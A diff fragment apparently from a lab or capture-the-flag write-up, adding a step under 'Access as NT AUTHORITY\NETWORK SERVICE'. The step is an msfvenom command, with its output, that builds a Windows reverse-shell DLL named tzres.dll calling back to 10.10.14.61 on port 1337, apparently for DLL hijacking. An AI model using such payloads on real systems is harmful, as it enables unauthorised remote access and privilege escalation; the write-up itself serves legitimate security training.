@@ -808,7 +808,17 @@ There is an alternative however
 
 # Access as `NT AUTHORITY\NETWORK SERVICE`
 
+```python
+❯❯❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.61 lport=1337 -f dll -o tzres.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: tzres.dll
+```
 
+First ill generate the DLL with the right name
 
 
 
